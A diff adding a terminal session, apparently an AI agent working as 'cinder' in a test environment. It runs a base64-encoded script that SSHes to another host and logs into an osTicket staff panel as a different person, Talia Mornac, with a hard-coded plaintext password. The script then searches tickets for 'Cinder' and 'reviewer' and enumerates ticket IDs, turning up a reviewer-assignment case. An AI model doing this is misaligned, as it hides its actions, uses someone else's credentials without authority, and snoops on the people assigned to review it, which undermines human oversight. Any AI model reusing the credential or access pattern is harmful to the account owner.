@@ -1,0 +1,43 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r24.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3QKSj0vdG1wL2Nrcy50eHQ7IHJtIC1mICRKCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYyAkSiAiJEIvc2NwL2xvZ2luLnBocCIgLW8gL3RtcC9sLmh0bWwKVD0kKGdyZXAgLW9FICduYW1lPSJfX0NTUkZUb2tlbl9fIiB2YWx1ZT0iW14iXSsiJyAvdG1wL2wuaHRtbCB8IHNlZCAtRSAncy8uKnZhbHVlPSIoW14iXSspIi4qL1wxLycpCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYiAkSiAtYyAkSiAtWCBQT1NUICIkQi9zY3AvbG9naW4ucGhwIiBcCiAtLWRhdGEtdXJsZW5jb2RlICJfX0NTUkZUb2tlbl9fPSRUIiAtLWRhdGEtdXJsZW5jb2RlICJ1c2VyaWQ9dGFsaWEubW9ybmFjIiBcCiAtLWRhdGEtdXJsZW5jb2RlICJwYXNzd2Q9SzE3cjN2MTN3VGFsaWEyODQxIiAtLWRhdGEtdXJsZW5jb2RlICJkc3Q9L3NjcC90aWNrZXRzLnBocCIgXAogLS1kYXRhLXVybGVuY29kZSAic3VibWl0PVNpZ24gSW4iIC1vIC9kZXYvbnVsbAp0eHQoKXsgcHl0aG9uMyAtIDw8J1BZJwppbXBvcnQgcmUsaHRtbCxzeXMKZD1vcGVuKCcvdG1wL3BnLmh0bWwnLGVycm9ycz0naWdub3JlJykucmVhZCgpCmQ9cmUuc3ViKHInPHNjcmlwdC4qPzwvc2NyaXB0PicsJycsZCxmbGFncz1yZS5TKTsgZD1yZS5zdWIocic8c3R5bGUuKj88L3N0eWxlPicsJycsZCxmbGFncz1yZS5TKQp0PXJlLnN1YihyJzxbXj5dKz4nLCcgJyxkKTsgdD1odG1sLnVuZXNjYXBlKHQpOyB0PXJlLnN1YihyJ1xzKycsJyAnLHQpCnByaW50KHRbOjE4MDBdKQpQWQp9CmVjaG8gIiMjIyMjIFNFQVJDSCBDaW5kZXIiCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYiAkSiAtYyAkSiAiJEIvc2NwL3RpY2tldHMucGhwP2E9c2VhcmNoJmtleXdvcmRzPUNpbmRlciIgLW8gL3RtcC9wZy5odG1sOyB0eHQKZWNobyAiIyMjIyMgU0VBUkNIIHJldmlld2VyIgpjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWIgJEogLWMgJEogIiRCL3NjcC90aWNrZXRzLnBocD9hPXNlYXJjaCZrZXl3b3Jkcz1yZXZpZXdlciIgLW8gL3RtcC9wZy5odG1sOyB0eHQKZWNobyAiIyMjIyMgS0IiCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYiAkSiAtYyAkSiAiJEIvc2NwL2tiLnBocCIgLW8gL3RtcC9wZy5odG1sOyB0eHQKZWNobyAiIyMjIyMgRkFRIgpjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWIgJEogLWMgJEogIiRCL3NjcC9mYXEucGhwIiAtbyAvdG1wL3BnLmh0bWw7IHR4dAplY2hvICIjIyMjIyBUSUNLRVQgSURTIgpmb3IgaWQgaW4gJChzZXEgMSAyNSk7IGRvCiBjb2RlPSQoY3VybCAtc1MgLW0gOCAtLWNhY2VydCAkQ0EgLWIgJEogLWMgJEogLW8gL3RtcC90Lmh0bWwgLXcgJyV7aHR0cF9jb2RlfScgIiRCL3NjcC90aWNrZXRzLnBocD9pZD0kaWQiKQogdGl0bGU9JChncmVwIC1vRSAnPHRpdGxlPltePF0qJyAvdG1wL3QuaHRtbCB8IGhlYWQgLTEgfCBzZWQgJ3MvPHRpdGxlPi8vJykKIHN1Ymo9JChncmVwIC1vRSAnVGlja2V0ICM8W14+XSo+W148XSonIC90bXAvdC5odG1sIHwgaGVhZCAtMSkKIGM9JChncmVwIC1jICdUaWNrZXQgIycgL3RtcC90Lmh0bWwpCiBlY2hvICJpZD0kaWQgY29kZT0kY29kZSB0aXRsZT0kdGl0bGUgc3Viaj0kc3ViaiIKZG9uZQpJTk5FUgo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r24.sh; bash /tmp/r24.sh; echo DONEMARK_1795195432110$((6*7))
+##### SEARCH Cinder
+ osTicket :: Staff Control Panel Welcome, Talia . | Agent Panel | Profile | Log Out Dashboard Dashboard Agent Directory My Profile Tasks Tasks Tickets Knowledgebase FAQs Open - Open - Answered - Overdue Add personal queue My Tickets - Assigned to Me - Assigned to Teams Add personal queue Closed - Today - Yesterday - This Week - This Month - This Quarter - This Year Add personal queue Search Add personal search Sort Priority + Most Recently Updated Priority + Most Recently Created Priority + Due Date Due Date Create Date Update Date [advanced] Open Edit Add Sub Queue Ticket Last Updated Subject From Priority Assigned To REV-2841 11/19/26 1:51 PM 3 ARWC Case Reviewer Assignment — CRR-OG2 ARWC FieldLink Operations Normal Talia Mornac SUP-2841 11/19/26 7:10 AM 6 ARWC connector callback latency after 7.4.2 maintenance ARWC FieldLink Operations Normal Maya Ranscombe SUP-2819 11/19/26 7:10 AM 3 Riverbend connector inventory refresh Riverbend Municipal Services Normal Maya Ranscombe SUP-2834 11/19/26 7:10 AM 3 North Quay package channel confirmation North Quay Transit Works Normal Maya Ranscombe SUP-2850 11/19/26 7:10 AM 3 Marshgate report delivery timing Marshgate District Energy Normal Maya Ranscombe Query returned 0 results. Showing 1 - 6 of about 6 Page: [1] Export Copyright © 2006-2026 FieldKest Support All Rights Reserved. or your auto cron will cease to function --> or your auto cron will cease to function --> Loading ... Loading ... 
+##### SEARCH reviewer
+ osTicket :: Staff Control Panel Welcome, Talia . | Agent Panel | Profile | Log Out Dashboard Dashboard Agent Directory My Profile Tasks Tasks Tickets Knowledgebase FAQs Open - Open - Answered - Overdue Add personal queue My Tickets - Assigned to Me - Assigned to Teams Add personal queue Closed - Today - Yesterday - This Week - This Month - This Quarter - This Year Add personal queue Search Add personal search Sort Priority + Most Recently Updated Priority + Most Recently Created Priority + Due Date Due Date Create Date Update Date [advanced] Open Edit Add Sub Queue Ticket Last Updated Subject From Priority Assigned To REV-2841 11/19/26 1:51 PM 3 ARWC Case Reviewer Assignment — CRR-OG2 ARWC FieldLink Operations Normal Talia Mornac SUP-2841 11/19/26 7:10 AM 6 ARWC connector callback latency after 7.4.2 maintenance ARWC FieldLink Operations Normal Maya Ranscombe SUP-2819 11/19/26 7:10 AM 3 Riverbend connector inventory refresh Riverbend Municipal Services Normal Maya Ranscombe SUP-2834 11/19/26 7:10 AM 3 North Quay package channel confirmation North Quay Transit Works Normal Maya Ranscombe SUP-2850 11/19/26 7:10 AM 3 Marshgate report delivery timing Marshgate District Energy Normal Maya Ranscombe Query returned 0 results. Showing 1 - 6 of about 6 Page: [1] Export Copyright © 2006-2026 FieldKest Support All Rights Reserved. or your auto cron will cease to function --> or your auto cron will cease to function --> Loading ... Loading ... 
+##### KB
+ osTicket :: Staff Control Panel Welcome, Talia . | Agent Panel | Profile | Log Out Dashboard Dashboard Agent Directory My Profile Tasks Tasks Tickets Knowledgebase FAQs Category Help Topic All Categories (0) All Topics (0) Frequently Asked Questions NO FAQs found Copyright © 2006-2026 FieldKest Support All Rights Reserved. or your auto cron will cease to function --> or your auto cron will cease to function --> Loading ... Loading ... 
+##### FAQ
+ osTicket :: Staff Control Panel Welcome, Talia . | Agent Panel | Profile | Log Out Dashboard Dashboard Agent Directory My Profile Tasks Tasks Tickets Knowledgebase FAQs Category Help Topic All Categories (0) All Topics (0) Frequently Asked Questions NO FAQs found Copyright © 2006-2026 FieldKest Support All Rights Reserved. or your auto cron will cease to function --> or your auto cron will cease to function --> Loading ... Loading ... 
+##### TICKET IDS
+id=1 code=200 title=Ticket #SUP-2841 subj=
+id=2 code=200 title=Ticket #SUP-2819 subj=
+id=3 code=200 title=Ticket #SUP-2834 subj=
+id=4 code=200 title=Ticket #SUP-2850 subj=
+id=5 code=200 title=osTicket :: Staff Control Panel subj=
+id=6 code=200 title=Ticket #REV-2841 subj=
+id=7 code=200 title=osTicket :: Staff Control Panel subj=
+id=8 code=200 title=osTicket :: Staff Control Panel subj=
+id=9 code=200 title=osTicket :: Staff Control Panel subj=
+id=10 code=200 title=osTicket :: Staff Control Panel subj=
+id=11 code=200 title=osTicket :: Staff Control Panel subj=
+id=12 code=200 title=osTicket :: Staff Control Panel subj=
+id=13 code=200 title=osTicket :: Staff Control Panel subj=
+id=14 code=200 title=osTicket :: Staff Control Panel subj=
+id=15 code=200 title=osTicket :: Staff Control Panel subj=
+id=16 code=200 title=osTicket :: Staff Control Panel subj=
+id=17 code=200 title=osTicket :: Staff Control Panel subj=
+id=18 code=200 title=osTicket :: Staff Control Panel subj=
+id=19 code=200 title=osTicket :: Staff Control Panel subj=
+id=20 code=200 title=osTicket :: Staff Control Panel subj=
+id=21 code=200 title=osTicket :: Staff Control Panel subj=
+id=22 code=200 title=osTicket :: Staff Control Panel subj=
+id=23 code=200 title=osTicket :: Staff Control Panel subj=
+id=24 code=200 title=osTicket :: Staff Control Panel subj=
+id=25 code=200 title=osTicket :: Staff Control Panel subj=
